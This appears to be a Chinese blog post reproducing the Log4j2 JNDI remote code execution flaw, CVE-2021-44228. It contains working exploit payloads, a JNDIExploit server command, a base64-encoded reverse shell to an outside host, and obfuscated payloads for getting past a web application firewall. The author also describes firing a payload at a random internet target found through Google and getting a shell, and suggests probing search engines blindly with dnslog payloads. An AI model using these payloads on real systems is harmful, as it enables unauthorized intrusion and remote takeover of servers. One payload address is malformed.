---
title: Apache Log4j2 RCE漏洞复现
tags:
  - log4j
  - CVE-2021-44228
copyright: true
categories:
  - 漏洞复现
abbrlink: 7b02d9dd
index_img: https://s1.ax1x.com/2021/12/10/ooEXND.png
date: 2021-12-10 15:28:01
---


Apache Log4j2某些功能存在递归解析，可直接构造恶意请求，触发远程代码执行漏洞。

1、版本 Apache Log4j 2.x <= 2.14.1

2、实际上 新版 Apache Log4j 2.x < 2.15.0-rc2，2.15.0-rc1存在绕过？

https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A

需要目标可出网。如果使用JNDI注入的形式，需要确认jdk版本。jdk11.0.1 8u191 7u201 6u211或更高版本，默认禁用JNDI注入。

### 本地复现

使用idea新建Maven项目:Log4j2_3201

pom.xml

```xml
<!--pom.xml-->
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.sec</groupId>
    <artifactId>Log4j2_3201</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j</artifactId>
            <version>2.14.0</version>
            <type>pom</type>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version>
        </dependency>
    </dependencies>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

</project>
```

HelloSlf4j.java

```java
// HelloSlf4j.java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class HelloSlf4j {
    public static final Logger LOGGER = LogManager.getLogger(HelloSlf4j.class);
    public static void main(String[] args) {
        System.out.println("Log4j2 RCE 2.0~2.14.1");
        System.out.println("Version: 2.14.0");
            LOGGER.error("${jndi:ldap://local.xxxxx.dns.1433.eu.org/sec}");
        }
    }

```

重新加载i项目/生成源代码并更新文件，运行：calc

![image-20211210201349137](https://s1.ax1x.com/2021/12/10/ooEx9H.png)

高版本jdk需要开启 jndi

```java
......
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
......
```

### Online

验证出网 ，盲打。

`${jndi:ldap://xxx.dnslog.cn/sec}` 扔baidu、360等直接搜索。

![image-20211210202000250](https://s1.ax1x.com/2021/12/10/ooEOAO.png)

### Online getshell

利用 JNDIExploit TomcatBypass 链

`ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]`

起JNDI服务

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 8.8.8.8 -l 8080 -p 8081
```
sh -i >& /dev/tcp/8.8.8.8/21 0>&1  ---> c2ggLWkgPiYgL2Rldi90Y3AvOC44LjguOC8yMSAwPiYx

```json
${jndi:ldap://8.8.8:8080/TomcatBypass/Command/Base64/c2ggLWkgPiYgL2Rldi90Y3AvOC44LjguOC8yMSAwPiYx}
```

Google随机找个Online target

![image-20211210203432384](https://s1.ax1x.com/2021/12/10/ooEqHK.png)

got shell

![image-20211210203720606](https://s1.ax1x.com/2021/12/10/ooEj4e.png)

Bypass WAF？来源网上，没试过，不知可行否。

```java
logger.error("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/e0mlja}");

"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ｄｎｓｌｏｇ．ｃｎ/}"
```

